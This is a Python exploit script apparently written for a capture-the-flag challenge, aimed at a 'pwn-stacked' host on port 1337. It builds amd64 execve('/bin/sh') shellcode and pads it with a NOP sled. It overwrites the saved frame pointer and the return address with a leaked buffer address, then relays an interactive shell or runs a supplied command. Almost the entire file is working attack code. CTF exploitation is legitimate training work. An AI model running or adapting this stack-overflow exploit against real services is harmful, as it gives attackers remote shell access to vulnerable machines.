#!/usr/bin/env python3
import argparse
import re
import socket
import struct
import sys
import select
import time


def build_shellcode() -> bytes:
    # amd64 execve("/bin/sh", NULL, NULL)
    return (
        b"\x48\x31\xd2"              # xor rdx, rdx
        b"\x48\x31\xf6"              # xor rsi, rsi
        b"\x48\x31\xff"              # xor rdi, rdi
        b"\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00"  # mov rbx, '/bin/sh\x00'
        b"\x53"                        # push rbx
        b"\x48\x89\xe7"              # mov rdi, rsp
        b"\x48\x31\xc0"              # xor rax, rax
        b"\x50"                        # push rax (NULL)
        b"\x57"                        # push rdi
        b"\x48\x89\xe6"              # mov rsi, rsp
        b"\xb0\x3b"                   # mov al, 59
        b"\x0f\x05"                   # syscall
    )


def build_payload(buf_addr: int) -> bytes:
    shellcode = build_shellcode()
    if len(shellcode) > 128:
        raise RuntimeError('Shellcode too large for buffer')
    padding = b"\x90" * (128 - len(shellcode))
    saved_rbp = b"B" * 8
    ret_addr = struct.pack('<Q', buf_addr)
    return shellcode + padding + saved_rbp + ret_addr


def recv_line(sock: socket.socket, timeout: float = 5.0) -> bytes:
    sock.settimeout(timeout)
    data = b""
    while True:
        ch = sock.recv(1)
        if not ch:
            break
        data += ch
        if ch == b"\n":
            break
    return data


def recv_until_buf(sock: socket.socket, timeout: float = 10.0) -> tuple[bytes, int | None]:
    end_time = time.time() + timeout
    banner = b""
    buf_addr: int | None = None
    while time.time() < end_time:
        try:
            line = recv_line(sock, timeout=0.5)
        except socket.timeout:
            line = b""
        if not line:
            continue
        banner += line
        m = re.search(rb"buf:\s*(0x[0-9a-fA-F]+)", line)
        if m:
            buf_addr = int(m.group(1), 16)
            break
    return banner, buf_addr


def interactive(sock: socket.socket):
    sock.setblocking(False)
    try:
        while True:
            r, _, _ = select.select([sock, sys.stdin], [], [])
            if sock in r:
                try:
                    data = sock.recv(4096)
                except BlockingIOError:
                    data = b""
                if not data:
                    return
                sys.stdout.buffer.write(data)
                sys.stdout.flush()
            if sys.stdin in r:
                user = sys.stdin.buffer.readline()
                if not user:
                    return
                sock.sendall(user)
    except KeyboardInterrupt:
        pass


def exploit(host: str, port: int, command: str | None = None):
    with socket.create_connection((host, port)) as sock:
        banner, buf_addr = recv_until_buf(sock)
        if banner:
            sys.stdout.buffer.write(banner)
            sys.stdout.flush()
        if buf_addr is None:
            print('Failed to parse buffer address', file=sys.stderr)
            return
        print(f'Leaked buffer: {hex(buf_addr)}')

        payload = build_payload(buf_addr) + b"\n"
        sock.sendall(payload)

        if command is None:
            interactive(sock)
        else:
            # Send the provided command and then exit
            if not command.endswith('\n'):
                command += '\n'
            to_send = command.encode() + b"exit\n"
            sock.sendall(to_send)

            # Read until the connection closes or timeout
            sock.settimeout(5.0)
            try:
                while True:
                    data = sock.recv(4096)
                    if not data:
                        break
                    sys.stdout.buffer.write(data)
                    sys.stdout.flush()
            except (socket.timeout, ConnectionResetError):
                pass


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Exploit for challenge-11 without external deps')
    parser.add_argument('--host', default='pwn-stacked.purple.ctfcompetition.com')
    parser.add_argument('--port', type=int, default=1337)
    parser.add_argument('--command', help='Optional command to run after shell spawns')
    args = parser.parse_args()
    exploit(args.host, args.port, args.command)


